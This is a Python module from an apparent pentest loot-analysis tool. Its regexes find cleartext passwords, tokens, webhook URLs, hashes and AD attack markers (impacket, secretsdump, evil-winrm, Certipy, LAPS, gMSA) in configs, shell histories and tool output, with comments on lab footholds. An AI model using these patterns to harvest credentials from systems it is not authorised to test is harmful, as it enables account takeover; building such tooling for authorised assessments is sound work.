"""keyword.py - secret_name = real_value, plus high-value cred/AD content shapes.

Passes per line:
  1. analyzers.credline - the single classifier for cred-bearing lines
     (netexec output, pwdump rows, ConvertTo-SecureString, plain user:pass).
     This replaces the old crude DOMAIN\\user:pass regex that flooded the
     report with icacls masks, pwdump rows and tool help-strings.
  2. a few inline-cred shapes credline doesn't own (autologon, runas, SQL
     IDENTIFIED BY, mysql -p, sshpass).
  3. generic `keyword = value` (filtered hard via analyzers.filters).
"""
import os
import re
from analyzers import filters, credline

KEY = re.compile(
    r'\b(pass(?:word|wd|phrase)?|pwd|secret|api[_-]?key|access[_-]?key|secret[_-]?key|'
    r'token|auth[_-]?token|bearer|bindpw|db_pass(?:word)?|smtp_pass|ftp_pass|sa_password|'
    r'ldap_account_service_password|private[_-]?key[_-]?password|client[_-]?secret|'
    r'master[_-]?key|encryption[_-]?key|secret[_-]?key[_-]?base|jwt[_-]?secret|'
    r'connection[_-]?string|conn[_-]?str|_authtoken|requirepass|masterauth)\b'
    r'\s*[:=]\s*(.+)', re.IGNORECASE)
SKIP_LINE = re.compile(r'^\s*(#|//|\*|/\*|--\s|;)')

# iter-187: bash-history CLI dispatchers need a NARROW placeholder check for
# the user argument. `filters.is_placeholder` was designed for config VALUES,
# so it lists common legit CLI usernames (admin, root, user, guest, postgres,
# cassandra, default, anonymous) as placeholders - which caused iter-182/183/
# 187 dispatchers to silently drop real creds like `mongo -u admin -p Real123`.
# This check only rejects OBVIOUS placeholder shapes:
#   <user> / <username>              angle-bracket template
#   {{ user }} / ${USER}             brace / dollar template
#   USER / YOUR_USER / CHANGE_ME     all-uppercase (3+ chars, letters/_ only)
# Keeps legit lowercase usernames intact.
_CLI_USER_PLACEHOLDER = re.compile(
    r'^(?:<[^>]+>|\{\{[^}]+\}\}|\$\{[^}]+\}|\$[A-Z][A-Z0-9_]{2,}|'
    r'[A-Z][A-Z0-9_]{2,}|CHANGE[_-]?ME|YOUR[_-]\w+|xxx+)$', re.IGNORECASE)

def _is_cli_placeholder(value):
    """True if `value` is an OBVIOUS template placeholder (used in bash-history
    dispatchers where common lowercase usernames like 'admin' are legit)."""
    if not value:
        return True
    v = value.strip("'\"")
    if _CLI_USER_PLACEHOLDER.match(v):
        # ...but keep valid lowercase words even if match succeeds via
        # case-insensitive alternation. Only reject uppercase-heavy shapes.
        if v.startswith(("<", "{{", "${", "$")) or v.upper() == v:
            return True
    return False

# code filetypes: require the value to be QUOTED (detect-secrets lesson).
_CODE_EXT = {".js", ".ts", ".py", ".rb", ".php", ".pl", ".ps1", ".java", ".go",
             ".c", ".cpp", ".cs", ".sh", ".tf", ".groovy"}

# inline-cred shapes that credline.classify does NOT already cover.
_AD = [
    # AutoLogon: matches BOTH .reg export ("DefaultPassword"="x") AND winPEAS /
    # `reg query` columnar output (DefaultPassword  REG_SZ  x).
    ("autologon password", re.compile(
        r'(?i)(?:"?DefaultPassword"?|AutoAdminLogon\s+password)\s*(?:["=:]+|\s+REG_SZ\s+)\s*["\']?([^"\'\r\n]{3,})')),
    # iter-189: CREATE USER 'x' IDENTIFIED BY 'y' - captures user + pw as a
    # pair so the downstream chain gets both. Also covers ALTER USER's `WITH
    # PASSWORD 'y'` variant (PostgreSQL). MUST sit BEFORE `SQL IDENTIFIED BY`
    # in this list since _AD is checked in order and the first match wins -
    # `SQL IDENTIFIED BY` would otherwise fire first with pw-only capture.
    ("SQL CREATE USER", re.compile(
        r"(?i)(?:CREATE|ALTER)\s+USER\s+['\"`]?"
        r"([A-Za-z_][A-Za-z0-9_.-]{1,63})"
        r"['\"`]?(?:@['\"`]?[^\s'\"`]+['\"`]?)?"
        r"\s+(?:IDENTIFIED\s+BY|WITH\s+PASSWORD)\s+"
        r"['\"`]([^'\"`\r\n]{3,80})['\"`]")),
    ("SQL IDENTIFIED BY", re.compile(r'(?i)IDENTIFIED\s+BY\s+["\']([^"\']{3,})["\']')),
    # iter-193: Generic opaque-token prefix detector. Iter-185's Bearer-only
    # pattern misses tokens embedded in `oauth_token: ghp_...` (gh CLI
    # hosts.yml), `token = "glpat-..."` (.gitconfig), .env file `SLACK_TOKEN=
    # xoxb-...` etc. This fires on ANY line containing a well-known prefix
    # with the expected token length. Provider inference in dispatch mirrors
    # iter-185's mapping. Length requirements are strict so short random
    # words with matching prefixes ('skate', 'gho' as prose) don't FP.
    ("opaque token prefix", re.compile(
        r'(?<![\w])('
        r'gh[pousr]_[A-Za-z0-9_]{36,}|'
        r'github_pat_[A-Za-z0-9_]{40,}|'
        r'glpat-[A-Za-z0-9_-]{20,}|'
        r'sk-(?:proj-)?[A-Za-z0-9_-]{40,}|'
        r'xoxb-\d+-\d+-[A-Za-z0-9]{24,}|'
        r'xoxp-\d+-\d+-\d+-[A-Za-z0-9]{32,}|'
        r'xox[asro]-[A-Za-z0-9-]{20,}|'
        r'xapp-\d+-[A-Za-z0-9-]{20,}|'
        r'doo?_v1_[A-Za-z0-9]{40,}|'
        r'nvapi-[A-Za-z0-9_-]{40,}|'
        r'SG\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{40,}'
        r')(?![\w])')),
    # iter-193: PAM misconfig - `pam_permit.so` used at auth stage always
    # succeeds. `pam_unix.so ... nullok` allows empty passwords. Both are
    # Linux privesc primitives when found in /etc/pam.d/common-auth,
    # /etc/pam.d/sshd, /etc/pam.d/su, etc. File-gated at dispatch.
    # Control field accepts both simple keywords (sufficient/optional/etc.)
    # AND bracketed expressions like `[success=1 default=ignore]` (which
    # PAM allows and is common on modern Debian /etc/pam.d/common-auth).
    ("PAM misconfig", re.compile(
        r'(?im)^\s*(auth|password)\s+(?:\[[^\]]+\]|\S+)'
        r'\s+(pam_permit\.so|pam_unix\.so[^\r\n]*?\bnullok(?:_secure)?)\b'
        r'([^\r\n]*)$')),
    # iter-189: Slack incoming webhook URL. Full URL is the secret - anyone
    # with it can post to the channel. Format:
    #   https://hooks.slack.com/services/T<TeamID>/B<ChannelID>/<24-char token>
    ("Slack webhook URL", re.compile(
        r'https://hooks\.slack\.com/services/T[A-Z0-9]{6,}/'
        r'B[A-Z0-9]{6,}/[A-Za-z0-9]{20,}')),
    # iter-189: Discord webhook URL. Same "full URL is the secret" model.
    ("Discord webhook URL", re.compile(
        r'https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/'
        r'\d{16,}/[A-Za-z0-9._-]{60,}')),
    # iter-189: MS Teams IncomingWebhook URL.
    # https://<tenant>.webhook.office.com/webhookb2/<guid>@<guid>/IncomingWebhook/<hex>/<guid>
    ("Teams webhook URL", re.compile(
        r'https://[a-z0-9-]+\.webhook\.office\.com/webhookb2/'
        r'[a-f0-9-]{20,}@[a-f0-9-]{20,}/IncomingWebhook/'
        r'[a-f0-9]{20,}/[a-f0-9-]{20,}')),
    ("mysql -p inline", re.compile(r'(?i)\bmysql\b[^\n]*?\s-p(\S{3,})')),
    ("sshpass -p", re.compile(r'(?i)sshpass\s+-p\s*["\']?([^"\'\s]{3,})')),
    ("runas /savecred", re.compile(r'(?i)runas\s+(?:/\w+\s+)*/user:(\S+)')),
    # iter-86: RDP saved session artifacts. The '.rdp' format stores lines
    # like 'username:s:HTB\\administrator' and 'full address:s:10.10.10.5'
    # in plaintext (the pw is DPAPI-encrypted 'password 51:b:...' - operator
    # needs the user's DPAPI masterkey to decrypt, which R-DPAPI already
    # chains when both are present). Surface the user + host so the
    # operator knows WHO was RDP'd to WHERE.
    ("RDP saved user", re.compile(r'^username:s:([^\r\n]{2,80})$')),
    ("RDP target host", re.compile(r'^full address:s:([^\r\n]{2,80})$')),
    # iter-87: RDCMan .rdg XML variant. Same DPAPI-encrypted password but
    # user/domain/server name are plaintext XML text nodes. One line at a
    # time is fine because RDCMan emits each field on its own line.
    ("RDCMan user", re.compile(r'<userName>([^<>\r\n]{2,80})</userName>')),
    ("RDCMan domain", re.compile(r'<domain>([^<>\r\n]{2,80})</domain>')),
    ("RDCMan server", re.compile(r'<name>([^<>\r\n]{2,80}\.[^<>\r\n]+)</name>')),
    ("ldapsearch -w bind", re.compile(r'(?i)\bldapsearch\b[^\n]*?\s-w\s*["\']([^"\']{3,})["\']')),
    ("smbclient -U pass", re.compile(r'(?i)\bsmbclient\b[^\n]*?\s-U\s+\S+%([^\s"\']{3,})')),
    # iter-182: broadened from psexec-only to the full impacket exec/dump/kerb
    # family (wmiexec/smbexec/atexec/dcomexec/secretsdump/getST/getTGT/getUserSPNs/
    # GetNPUsers/lookupsid/rpcdump/mssqlclient). Also allow both `impacket-<tool>`
    # (Kali packaging) and bare `<tool>.py`, and both `DOMAIN/user:pass@host`
    # (kerb / DC login) and `user:pass@host` (WORKGROUP / local). Groups:
    # (1) optional domain, (2) user, (3) pw, (4) target host.
    ("impacket inline", re.compile(
        r'(?i)\b(?:impacket-)?(?:psexec|wmiexec|smbexec|atexec|dcomexec|'
        r'secretsdump|getST|getTGT|getUserSPNs|GetNPUsers|lookupsid|'
        r'rpcdump|mssqlclient)(?:\.py)?\b[^\r\n]*?\s'
        r'(?:(\S+)/)?([A-Za-z_][A-Za-z0-9._$-]{0,39}):'
        r'([^\s@"\']{3,80})@(\S+)')),
    # MSSQL setup-INI keys: SAPWD, SQLSVCPASSWORD, AGTSVCPASSWORD, RSSVCPASSWORD,
    # ISSVCPASSWORD, FTSVCPASSWORD (EscapeTwo, real exam-style ConfigurationFile.ini).
    # These slip past the generic KEY regex because `\bpassword` won't match
    # mid-word in `SQLSVCPASSWORD`.
    ("MSSQL setup key", re.compile(
        r'(?i)\b(?:SA|AGTSVC|SQLSVC|RSSVC|ISSVC|FTSVC|ASSVC)(?:PWD|PASSWORD)\s*=\s*["\']?([^"\'\s\r\n]{3,})["\']?')),
    # PHP define('CONST_*', 'value')  -  WordPress wp-config.php (DB_PASSWORD,
    # AUTH_KEY, NONCE_SALT, etc.) plus any CONST whose name ends in PASSWORD /
    # SECRET / KEY / TOKEN. `\bpass(word)?` won't catch DB_PASSWORD because
    # the boundary fails between `B` and `P`.
    ("PHP define secret", re.compile(
        r"(?i)\bdefine\s*\(\s*['\"]([A-Z][A-Z0-9_]*(?:PASSWORD|PASS|PWD|SECRET|KEY|SALT|TOKEN))['\"]"
        r"\s*,\s*['\"]([^'\"\r\n]{3,})['\"]")),
    # Plain $varEndingInPwdLike = "X":  Joomla $password / $smtppass, MediaWiki
    # $wgDBpassword / $wgSecretKey, Drupal $databases array values, any $\w*
    # ending in password/pass/pwd/secret/salt/authtoken. We deliberately omit
    # $key/$token (too generic - matches encryption-key config vars).
    ("PHP var secret", re.compile(
        r"(?i)\$\w*(?:password|passwd|pwd|secret|salt|authtoken|smtppass|ftppass|dbpass)\b"
        r"\s*=\s*['\"]([^'\"\r\n]{3,})['\"]")),
    # PHP nested-array string key: 'password' => 'X', 'db_passwd' => 'X', "PWD" => "X"
    # (Koken database.php, OpenAdmin $ona_contexts, generic Phinx/Slim configs)
    ("PHP array secret", re.compile(
        r"(?i)['\"](?:db_)?(?:password|passwd|pwd|secret|salt|smtppass)['\"]"
        r"\s*=>\s*['\"]([^'\"\r\n]{3,})['\"]")),
    # MongoDB BSON shell output: { ..., "username" : "X", "password" : "Y" }
    ("MongoDB BSON", re.compile(
        r'"username"\s*:\s*"([^"]{1,40})"[^}]{0,200}?"password"\s*:\s*"([^"]{3,80})"')),
    # Legacy Windows LAPS cleartext attribute: ms-Mcs-AdmPwd: <pw>
    # (post-decryption read; Streamio / Outdated / Rebound modern fixture)
    ("LAPS ms-Mcs-AdmPwd", re.compile(
        r'(?i)\bms-mcs-admpwd\s*:\s*(?!\s)([^\r\n]{3,80})')),
    # Windows LAPS v2 cleartext-after-decrypt output: 'Password : <pw>' under
    # 'ComputerName' / 'Account' block produced by Get-LapsADPassword -AsPlainText
    ("LAPS v2 cleartext", re.compile(
        r'(?im)^\s*Password\s*:\s*([^\r\n]{6,80})$')),
    # gMSA managed password LDIF attribute (base64 blob; flag, don't try to decode).
    # The classic LDIF `::` prefix indicates base64; gMSADumper does the NTLM parse.
    ("gMSA ManagedPassword", re.compile(
        r'(?i)\bmsDS-ManagedPassword\b\s*::\s*([A-Za-z0-9+/=]{40,})')),
    # Shadow credentials marker - msDS-KeyCredentialLink writes are non-destructive
    # but high-signal (precondition for PKINIT NT-hash recovery via Certipy).
    ("Shadow credentials", re.compile(
        r'(?i)msDS-KeyCredentialLink\b|Adding Key Credential with device ID')),
    # Certipy `Got hash for 'user@DOM': LM:NT` shadow-creds / PKINIT output.
    # We DON'T put this in `_AD` to keep the unconditional CRED-pair routing
    # below clean; instead it's split out so we can emit user-bound NT.
    ("Certipy got-hash", re.compile(
        r"(?i)\b(?:Got|NT)\s+hash\s+for\s+['\"]?([^\s'\":@]{1,40})(?:@[^\s'\"]+)?['\"]?\s*:\s*"
        r"(?:([a-f0-9]{32}):)?([a-f0-9]{32})\b")),
    # tomcat-users.xml <user username="X" password="Y" roles="Z"/>  - capture both
    # user and pw, plus roles so the hint distinguishes RCE-path (manager-script /
    # admin-gui) from read-only.
    ("tomcat-users", re.compile(
        r'(?i)<user\s+(?=[^>]*\busername\s*=\s*["\']([^"\']{1,40})["\'])'
        r'(?=[^>]*\bpassword\s*=\s*["\']([^"\']{1,80})["\'])'
        r'(?:[^>]*\broles\s*=\s*["\']([^"\']{0,200})["\'])?[^>]*/?>')),
    # FileZilla / similar: <Pass encoding="base64">b64</Pass>
    ("FileZilla pass", re.compile(
        r'(?i)<Pass\s+encoding\s*=\s*["\']base64["\']\s*>([A-Za-z0-9+/=]{4,200})</Pass>')),
    # Windows unattend.xml: <Value>X</Value> inside a Password/AdministratorPassword
    # where <PlainText>true</PlainText> appears on the same line OR within ~80
    # chars. (Plaintext branch only - the base64-UTF16LE branch needs proper XML
    # context tracking and lives in a separate analyzer.)
    ("unattend plaintext", re.compile(
        r'(?i)<Password>\s*<Value>([^<\r\n]{3,})</Value>\s*<PlainText>\s*true\s*</PlainText>')),
    # Jenkins encrypted blob in credentials.xml - cannot decrypt without master.key
    # + hudson.util.Secret (the full chain), but flag the file as a high-value
    # target and point to the offline decoder.
    ("Jenkins enc blob", re.compile(
        r'\{AQAAA[A-Za-z0-9+/=]{20,}\}')),
    # ---- iter-6 INTEL markers (not raw creds; high-signal next-step pointers) ----
    # AD CS ESC vuln from certipy/certify output. Broad match here; the dispatch
    # branch requires an ADCS context word on the line to avoid 'ESC1' FPs.
    ("ADCS ESC", re.compile(r'\bESC(1[0-6]|[1-9])\b')),
    # RBCD: the attribute name is unique enough to flag unconditionally.
    ("RBCD marker", re.compile(r'(?i)\bmsDS-AllowedToActOnBehalfOfOtherIdentity\b')),
    # BloodHound ACL edge, arrow form: name --[WriteOwner]--> target (distinctive).
    # A real edge always points at a destination principal; require a node token
    # after the arrow so prose that merely names the notation (e.g. a markdown doc:
    # "reading `--[GenericAll]-->` style edges") doesn't FP.
    ("BloodHound ACL edge", re.compile(
        r'--\[(WriteDacl|WriteOwner|GenericAll|GenericWrite|ForceChangePassword|'
        r'AddMember|Owns|AllExtendedRights|AddKeyCredentialLink|ReadGMSAPassword|'
        r'ReadLAPSPassword|AddSelf|WriteSPN)\]-->\s*["\']?[A-Za-z0-9][\w$.@-]+')),
    # WSUS abuse tool invocation.
    ("WSUS abuse", re.compile(r'(?i)\bSharpWSUS(?:\.exe)?\s+(?:create|approve|check|delete)\b')),
    # DPAPI masterkey recovery output / mimikatz dpapi module.
    ("DPAPI masterkey", re.compile(
        r'(?i)dpapi::masterkey|\[masterkey\]\s*[a-f0-9]{32,}|guidMasterKey')),
    # ADO.NET connection string: connectionString="...;User ID=x;Password=y;"
    # (Mantis Orchard web.config). Captures the whole value; branch parses it.
    ("ADO connectionString", re.compile(
        r'(?i)connectionString\s*=\s*["\']([^"\'\r\n]{8,400})["\']')),
    # ---- iter-7 round-2 completeness adds (from workflow's missing-class list) ----
    # SQL INSERT cred row: INSERT INTO users (..., username, ..., password, ...)
    # VALUES (..., 'X', ..., '$2y$10$...', ...); also pg/MySQL COPY/dump format.
    # Captures bcrypt/MD5/plain into PASSWORD HASHES.
    ("SQL INSERT cred row", re.compile(
        r"(?i)INSERT\s+INTO\s+\W?(?:users?|members?|accounts?|admins?|"
        r"login|customers?|employees?)[^()]*\([^)]*\bpassword\b[^)]*\)\s*VALUES\s*\(([^)]+)\)")),
    # SNMP community strings: rocommunity/rwcommunity + value (+ optional ACL).
    # Direct enum vector - rwcommunity = direct foothold on the OSCP exam.
    ("SNMP community", re.compile(
        r'(?i)^\s*(rocommunity|rwcommunity|rocommunity6|rwcommunity6)\s+'
        r'([^\s#]{3,60})(?:\s+([^\s#]+))?')),
    # docker-compose / k8s / .env environment variables that look credential-y.
    # MYSQL_ROOT_PASSWORD, POSTGRES_PASSWORD, REDIS_PASSWORD etc.
    ("docker env secret", re.compile(
        r'(?i)\b(MYSQL_(?:ROOT_)?PASSWORD|POSTGRES_(?:DB_)?PASSWORD|MARIADB_(?:ROOT_)?PASSWORD|'
        r'MONGO(?:DB)?_(?:INITDB_)?(?:ROOT_)?PASSWORD|REDIS_PASSWORD|RABBITMQ_(?:DEFAULT_)?PASS|'
        r'ELASTIC_PASSWORD|MINIO_(?:ROOT_)?(?:USER|PASSWORD)|GF_SECURITY_ADMIN_PASSWORD|'
        r'KEYCLOAK_ADMIN_PASSWORD|HASURA_GRAPHQL_ADMIN_SECRET|'
        r'SMTP_(?:PASSWORD|PASS|AUTH_PASSWORD))\s*[:=]\s*["\']?([^"\'\r\n]{3,80})["\']?')),
    # PowerShell PSReadLine history: cmdkey /add:host /user:DOM\u /pass:X
    # (one of the highest-value OSCP+ history-file lines).
    # `\w` doesn't include '\' so we use `[^\s/]+` for the inter-flag tokens.
    ("cmdkey history", re.compile(
        r'(?i)\bcmdkey(?:\.exe)?\s+(?:/[^\s/]+\s+)*/pass(?:word)?\s*[:=]\s*([^\s/]{3,80})')),
    # ASP.NET machineKey - both halves are crackable hex for ViewState forgery.
    ("ASP.NET machineKey", re.compile(
        r'(?i)<machineKey\b[^>]*?\bvalidationKey\s*=\s*["\']([A-F0-9]{16,})["\'][^>]*?'
        r'\bdecryptionKey\s*=\s*["\']([A-F0-9]{16,})["\']')),
    # SCCM Network Access Account (NAA) is two-line - handled by
    # _multiline_passes() below, not the line-by-line _AD loop.
    # LSA-secrets section in secretsdump (machine account + LSA SCM service creds)
    ("LSA secret", re.compile(
        r'(?i)\$MACHINE\.ACC\s*:\s*([a-f0-9]{32}:[a-f0-9]{32})|'
        r'^SCM\s*:\s*\{[^}]*\}\s*:\s*(\S+):(\S+)', re.MULTILINE)),
    # ---- iter-8 round-1 completeness adds ----
    # Certipy 'find -vulnerable' template block markers (per-ESC verbose dump).
    # The block carries 'Template Name : <name>' + 'Vulnerabilities : ESC<n>'
    # + 'Enrollment Rights : <principal list>' - we capture the template name +
    # ESC number for a precise per-template finding.
    ("Certipy template ESC", re.compile(
        r'(?i)Template\s+Name\s*:\s*(\S[^\r\n]{0,60})[\s\S]{0,800}?'
        r'Vulnerabilit(?:y|ies)\s*:\s*([^\r\n]{1,120})')),
    # PostgreSQL pg_hba.conf 'trust' / 'md5' / 'scram-sha-256' / 'password' lines:
    # `local all all trust` means anyone can become any DB user from localhost
    # without a password. 'host all all 0.0.0.0/0 trust' = unauth remote DB.
    ("pg_hba auth method", re.compile(
        r'^\s*(local|host|hostssl|hostnossl|hostgssenc|hostnogssenc)\s+'
        r'(\S+)\s+(\S+)\s+(?:(\S+)\s+)?(trust|password|reject)\b', re.MULTILINE)),
    # MySQL/MariaDB option file [client] / [mysql] / [mysqldump] sections with
    # plaintext password=... (.my.cnf, /etc/mysql/debian.cnf).
    ("mysql client opt", re.compile(
        r'(?im)^\s*password\s*=\s*["\']?([^"\'#\r\n]{3,80})["\']?\s*$')),
    # iter-26: .bash_history / .zsh_history / .fish_history typed creds.
    # Common shapes (per HTB/THM walkthroughs):
    #   mysql -u root -pP@ss123
    #   mysql -u root --password=P@ss123
    #   curl -u admin:P@ss123 http://...
    #   curl -H "Authorization: Basic <b64>" ...   (handled by encoded.py)
    #   sshpass -p 'P@ss123' ssh user@host
    #   ftp -u user:pass ftp://...
    #   psql 'host=db user=postgres password=P@ss'
    # Capture each common form once per line. Per-rule dispatch parses out
    # the user/pw and emits CRED PAIRS.
    ("bash history mysql -p", re.compile(
        r'(?i)\b(?:mysql|mariadb|mysqldump)\s+[^\r\n]*?(?:-u|--user[= ])\s*'
        r'["\']?(\S{1,40})["\']?[^\r\n]*?(?:-p|--password[= ])\s*'
        r'["\']?([^"\'\s][^"\'\s\r\n]{1,79})["\']?')),
    ("bash history sshpass -p", re.compile(
        r'(?i)\bsshpass\s+-p\s+["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?\s+'
        r'(?:ssh|scp|rsync)\s+[^\r\n]*?(\S+@\S+)')),
    # iter-31 FP fix: the user portion must not look like a URL scheme
    # (http/https/ftp/etc.) - otherwise `curl -u http://<IP>:8080/api`
    # matched with user='http' pw='//<IP>...' which is a URL, not a cred.
    # Also reject when the user starts with '<' (placeholder) or contains '/'.
    ("bash history curl -u", re.compile(
        r'(?i)\bcurl\s+[^\r\n]*?(?:-u|--user)\s+'
        r'["\']?(?!(?:https?|ftp|smb|s3|file|ldap|ssh)://)'
        r'([A-Za-z_][A-Za-z0-9._-]{0,39}):'
        r'([^"\'\s/<][^"\'\s\r\n]{1,79})["\']?')),
    ("bash history wget --user", re.compile(
        r'(?i)\bwget\s+[^\r\n]*?--user[= ]\s*["\']?(\S{1,40})["\']?\s+'
        r'[^\r\n]*?--password[= ]\s*["\']?([^"\'\s][^"\'\s\r\n]{1,79})["\']?')),
    # iter-182: PGPASSWORD= env-var prefix. Extremely common in bash history
    # around lab Postgres foothold: `PGPASSWORD='p@ss!' psql -U alice -h host -d db`.
    # Also fires on Dockerfile `ENV PGPASSWORD=`, systemd `Environment=PGPASSWORD=`,
    # .env files. Captures pw (group 1) + optional -U user (group 2, forward-looking
    # search up to 200 chars for psql/pg_dump/pg_restore's user flag).
    ("bash history PGPASSWORD", re.compile(
        r'(?i)\bPGPASSWORD\s*=\s*["\']?([^"\'\s\r\n]{3,80})["\']?'
        r'(?:[^\r\n]{0,200}?\b(?:psql|pg_dump|pg_restore|pg_dumpall|pg_isready)\b'
        r'[^\r\n]{0,200}?\s-U\s+["\']?([A-Za-z_][A-Za-z0-9._-]{0,39})["\']?)?')),
    # iter-182: MYSQL_PWD= env-var prefix. Same rationale as PGPASSWORD;
    # `MYSQL_PWD='p@ss' mysql -u root -h host` avoids -p's 'Using password on the
    # command line' warning so it's the recommended non-interactive form in
    # walkthroughs. Captures pw (group 1) + optional -u user (group 2).
    ("bash history MYSQL_PWD", re.compile(
        r'(?i)\bMYSQL_PWD\s*=\s*["\']?([^"\'\s\r\n]{3,80})["\']?'
        r'(?:[^\r\n]{0,200}?\b(?:mysql|mysqldump|mariadb|mariadb-dump)\b'
        r'[^\r\n]{0,200}?\s(?:-u|--user[= ])\s*["\']?([A-Za-z_][A-Za-z0-9._-]{0,39})["\']?)?')),
    # iter-182: NetExec / crackmapexec / cme -u <user> -p <pw>. The single most
    # common typed-cred shape in modern OSCP+ bash history. Protocol argument
    # (smb/ldap/ssh/mssql/winrm/rdp/vnc/wmi/nfs/ftp) sits between the tool and
    # the target, so we just consume up to the -u flag. -p can be immediately
    # followed by the pw (quoted or unquoted); handle both.
    ("bash history nxc/cme", re.compile(
        r'(?i)\b(?:nxc|netexec|crackmapexec|cme)\s+'
        r'(?:smb|ldap|ssh|mssql|winrm|rdp|vnc|wmi|nfs|ftp)\s+'
        r'[^\r\n]*?\s-u\s+["\']?([^"\'\s]{1,40})["\']?'
        r'\s+[^\r\n]*?-p\s+["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?')),
    # iter-187: redis-cli -h host -p 6379 -a 'pw'. Redis is a common
    # HTB/THM foothold (open-port 6379). The -a flag inlines the pw and
    # its use in scripted enum tooling means it lands in bash history.
    # Captures pw (group 1); user is 'default' on Redis 6+.
    ("bash history redis-cli", re.compile(
        r'(?i)\bredis-cli\b[^\r\n]*?\s-a\s+["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?')),
    # iter-187: mongo / mongosh -u X -p Y. Legacy mongo shell + modern
    # mongosh both accept -u/--username + -p/--password. Also allow the
    # long forms `--username=X --password=Y`. Note the `\b(mongo|mongosh)\b`
    # engineering: alternation tries mongo first, but \b after 'mongo' in
    # 'mongosh' fails (s is word char), engine backtracks to try mongosh,
    # so both match cleanly.
    ("bash history mongo -u", re.compile(
        r'(?i)\b(?:mongo|mongosh)\b[^\r\n]*?(?:-u|--username)[= ]\s*'
        r'["\']?([^"\'\s]{1,40})["\']?'
        r'\s+[^\r\n]*?(?:-p|--password)[= ]\s*'
        r'["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?')),
    # iter-187: cqlsh <host> <port> -u X -p Y. Cassandra shell.
    ("bash history cqlsh", re.compile(
        r'(?i)\bcqlsh\b[^\r\n]*?-u\s+["\']?([^"\'\s]{1,40})["\']?'
        r'\s+[^\r\n]*?-p\s+["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?')),
    # iter-187: influx (1.x) -username X -password Y. Influx 2.x uses
    # tokens (which land as `-t <token>`), covered by other rules.
    ("bash history influx", re.compile(
        r'(?i)\binflux(?:v?1)?\b[^\r\n]*?-username\s+["\']?([^"\'\s]{1,40})["\']?'
        r'\s+[^\r\n]*?-password\s+["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?')),
    # iter-184: schtasks /create /RU X /RP Y - Windows scheduled task with
    # cleartext user + pw. When operators script periodic exec with a service
    # account this pattern lives in .bat / .ps1 / cmd history. Also handles
    # `-RU`/`-RP` short form (PowerShell aliasing).
    ("bash history schtasks", re.compile(
        r'(?i)\bschtasks(?:\.exe)?\s+[/-]create\b'
        r'[^\r\n]*?[/-]RU[= ]\s*["\']?([^"\'\s]{1,60})["\']?'
        r'\s+[^\r\n]*?[/-]RP[= ]\s*["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?')),
    # iter-184: kubectl config set-credentials NAME --token=X. Modern K8s
    # deploy: operator wires up a service account, token lands in bash
    # history. Rejects `<token>` and short tokens; real JWTs are >= 100 chars.
    ("bash history kubectl set-cred token", re.compile(
        r'(?i)\bkubectl\s+config\s+set-credentials\s+(\S{1,60})'
        r'[^\r\n]*?--token[= ]\s*["\']?([A-Za-z0-9._-]{20,})["\']?')),
    # iter-184: kubectl config set-credentials NAME --username=X --password=Y.
    # Older / basic-auth K8s deploys.
    ("bash history kubectl set-cred pw", re.compile(
        r'(?i)\bkubectl\s+config\s+set-credentials\s+(\S{1,60})'
        r'[^\r\n]*?--username[= ]\s*["\']?([^"\'\s]{1,60})["\']?'
        r'\s+[^\r\n]*?--password[= ]\s*["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?')),
    # iter-183: `net use \\host\share pw /user:[DOM\]user` - Windows cmd/PS
    # history saves this shape when an operator mounts a share with an inline
    # pw. Also fires on `net use z: \\host\share pw /user:X`. The order is
    # net use TARGET [PW] /user:USER (pw can be a lone token OR '*'), so we
    # anchor on \\host\share then grab the next non-flag token as pw and
    # the /user:X token as user. Rejects '*' (interactive prompt marker).
    ("bash history net use", re.compile(
        r'(?i)\bnet\s+use\b[^\r\n]{0,80}?'
        r'\\\\[^\s\\]+\\[^\s\r\n]+\s+'
        r'(?!/)([^\s*/][^\s\r\n]{2,79})'
        r'\s+/user:([^\s\r\n"\']{1,60})')),
    # iter-183: az login --username X --password Y (Azure CLI). Also handles
    # -u/-p short form. Placeholder-guarded so common docs `az login -u <user>`
    # gets filtered.
    ("bash history az login", re.compile(
        r'(?i)\baz\s+login\b[^\r\n]*?(?:--username|--user|-u)[= ]\s*'
        r'["\']?([^"\'\s]{1,80})["\']?'
        r'\s+[^\r\n]*?(?:--password|--pw|-p)[= ]\s*'
        r'["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?')),
    # iter-183: docker login -u X -p Y [registry]. Also accepts long forms
    # (--username/--user, --password/--pw). Registry defaults to docker.io
    # when omitted; we optionally capture it for the hint.
    ("bash history docker login", re.compile(
        r'(?i)\bdocker\s+login\b[^\r\n]*?(?:-u|--user(?:name)?)[= ]\s*'
        r'["\']?([^"\'\s]{1,60})["\']?'
        r'\s+[^\r\n]*?(?:-p|--pass(?:word)?|--pw)[= ]\s*'
        r'["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?'
        r'(?:\s+([^\s\-][^\s\r\n]{2,80}))?')),
    # iter-183: echo 'p@ss' | sudo -S <cmd>. Extremely common walkthrough
    # shape when a script needs non-interactive sudo. The pw always sits in
    # the echo arg (quoted for shell safety) and the `-S` flag tells sudo
    # to read from stdin. Also handles `printf`. Reject if pw is bash var.
    ("bash history piped sudo -S", re.compile(
        r'(?i)\b(?:echo|printf)\s+["\']([^"\'\r\n]{3,80})["\']'
        r'\s*\|\s*(?:sudo|/usr/bin/sudo)\b[^|\r\n]{0,120}?\s-S\b')),
    # iter-182: evil-winrm -i host -u user -p pass. Standard PowerShell foothold
    # once WinRM is open. Order of flags varies (some walkthroughs put -u before
    # -i), so accept either order. Note: `(?:[^\r\n]*?\s)?-u` — after the tool
    # name's required \s+, we optionally consume `<flags> ` before -u (handles
    # the `-i host -u ...` order) but also allow -u to be the very first flag
    # (`-u alice -i host ...`) without needing another space in front.
    ("bash history evil-winrm", re.compile(
        r'(?i)\bevil-winrm(?:\.rb)?\s+'
        r'(?:[^\r\n]*?\s)?-u\s+["\']?([^"\'\s]{1,40})["\']?'
        r'\s+[^\r\n]*?-p\s+["\']?([^"\'\s][^"\'\s\r\n]{2,79})["\']?')),
